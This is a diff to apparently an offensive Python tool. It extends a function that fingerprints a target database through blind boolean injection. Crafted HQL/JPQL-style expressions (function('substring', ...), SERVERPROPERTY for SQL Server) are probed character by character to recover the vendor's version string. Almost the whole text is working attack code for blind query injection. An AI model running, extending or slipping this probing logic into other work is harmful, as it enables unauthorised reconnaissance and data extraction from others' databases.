@@ -636,11 +636,13 @@ def detect_db_vendor_and_version() -> tuple[str , str ]:
                     vendor = "MySQL"
             # Attempt version extraction if we have an expression
             if ver_expr:
+                # SQL Server: SERVERPROPERTY returns sql_variant; coerce to NVARCHAR via CONCAT for LEN/SUBSTRING
+                if name == "SQLServer":
+                    ver_expr = "function('CONCAT','', function('SERVERPROPERTY','ProductVersion'))"
                 # Try to discover length and then dump a few leading chars via boolean probes
                 # First: ensure non-empty
                 if _len_ge(ver_expr, 1) is True:
-                    # Recover up to 20 chars (sufficient for most banners) by binary search on char set
-                    # Simple brute over expected charset "0123456789abcdef.ABCDEF-+_()/ "
+                    # Recover up to 20 chars (sufficient for most banners) by brute over a safe charset
                     charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._- +()/"
                     v = ""
                     for pos in range(1, 21):
@@ -648,7 +650,9 @@ def detect_db_vendor_and_version() -> tuple[str , str ]:
                         for c in charset:
                             # SUBSTRING is 1-based and named SUBSTRING in most dialects; route via function()
                             if _probe(f"function('substring',{ver_expr},{pos},1) = '{esc(c)}'") is True:
-                                v += c; advanced = True; break
+                                v += c
+                                advanced = True
+                                break
                         if not advanced:
                             # Stop at first non-match; likely end of string
                             break
